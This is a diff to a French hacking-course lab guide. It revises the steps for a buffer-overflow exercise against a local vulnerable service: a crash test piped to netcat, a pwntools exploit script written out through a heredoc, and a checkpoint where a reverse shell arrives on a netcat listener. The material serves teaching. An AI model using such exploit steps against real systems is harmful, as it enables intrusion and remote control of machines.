@@ -76,6 +76,7 @@ mkdir -p ~/cours-hacking/jour-3/labs && cd ~/cours-hacking/jour-3/labs
 ### Étape 1 — Test crash
 
 ```bash
+cd ~/cours-hacking/jour-3/labs
 python3 -c "print('A'*100)" | nc localhost 9001
 # → Input received: AAAA... (le programme répond avant de crasher — overflow confirmé)
 ```
@@ -91,9 +92,9 @@ void vulnerable_function(char *input) {
 }
 ```
 
-Créez `~/cours-hacking/jour-3/labs/exploit_bof.py` :
-
-```python
+```bash
+cd ~/cours-hacking/jour-3/labs
+cat > exploit_bof.py << 'PYEOF'
 #!/usr/bin/env python3
 from pwn import *
 
@@ -114,6 +115,8 @@ r = remote('localhost', 9001, timeout=10)
 r.sendline(payload)
 print("[+] Payload envoyé. Vérifiez l'écouteur netcat.")
 r.interactive()
+PYEOF
+echo "Fichier créé : exploit_bof.py"
 ```
 
 ### Étape 3 — Lancer l'attaque
@@ -127,7 +130,7 @@ cd ~/cours-hacking/jour-3/labs
 python3 exploit_bof.py
 ```
 
-**Checkpoint :** Shell reçu sur netcat. La cible (buffovf) exécute le shellcode.
+**Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante et un prompt shell apparaissent. La cible (buffovf) exécute le shellcode.
 
 ### Diagnostic reverse shell IP
 
@@ -163,6 +166,8 @@ flowchart LR
 ```
 
 ### Étape 1 — Vérifier le blocage
+
+Dans un terminal :
 
 ```bash
 # Requête normale
